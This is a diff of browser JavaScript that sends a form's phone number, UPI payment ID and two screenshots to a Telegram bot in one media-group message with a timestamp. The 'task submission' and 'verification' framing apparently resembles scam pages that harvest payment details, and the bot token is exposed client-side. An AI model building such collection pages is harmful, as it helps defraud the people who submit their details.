@@ -218,38 +218,41 @@
     const file1 = document.getElementById('screenshot1').files[0];
     const file2 = document.getElementById('screenshot2').files[0];
 
-    const caption1 = `🔔 NEW TASK SUBMISSION\n\n📱 Registered Number: ${phone}\n💳 UPI ID: ${upi}\n🖼 Screenshot: 1/2`;
-    const caption2 = `📱 Number: ${phone}\n💳 UPI ID: ${upi}\n🖼 Screenshot: 2/2`;
+    // Get current Date & Time (IST)
+    const now = new Date();
+    const dateTime = now.toLocaleString('en-IN', { 
+      timeZone: 'Asia/Kolkata', 
+      dateStyle: 'medium', 
+      timeStyle: 'short' 
+    });
 
-    const formData1 = new FormData();
-    formData1.append('chat_id', chatId);
-    formData1.append('photo', file1);
-    formData1.append('caption', caption1);
+    const caption = `🔔 NEW TASK SUBMISSION\n\n📱 Registered Number: ${phone}\n💳 UPI ID: ${upi}\n📅 Date & Time: ${dateTime}`;
 
-    const formData2 = new FormData();
-    formData2.append('chat_id', chatId);
-    formData2.append('photo', file2);
-    formData2.append('caption', caption2);
+    // Create a Media Group to send photos together
+    const mediaGroup = [
+      { type: 'photo', media: 'attach://photo1', caption: caption },
+      { type: 'photo', media: 'attach://photo2' }
+    ];
+
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('media', JSON.stringify(mediaGroup));
+    formData.append('photo1', file1);
+    formData.append('photo2', file2);
 
     try {
-      const res1 = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMediaGroup`, {
         method: 'POST',
-        body: formData1
+        body: formData
       });
 
-      const res2 = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: 'POST',
-        body: formData2
-      });
+      const data = await res.json();
 
-      const data1 = await res1.json();
-      const data2 = await res2.json();
-
-      if (data1.ok && data2.ok) {
+      if (data.ok) {
         document.getElementById('formContainer').style.display = 'none';
         document.getElementById('successScreen').style.display = 'block';
       } else {
-        const errorMsg = data1.description || data2.description || 'Unknown Telegram Error';
+        const errorMsg = data.description || 'Unknown Telegram Error';
         alert('Telegram Error: ' + errorMsg);
         submitBtn.disabled = false;
         submitBtn.innerText = 'SUBMIT VERIFICATION';
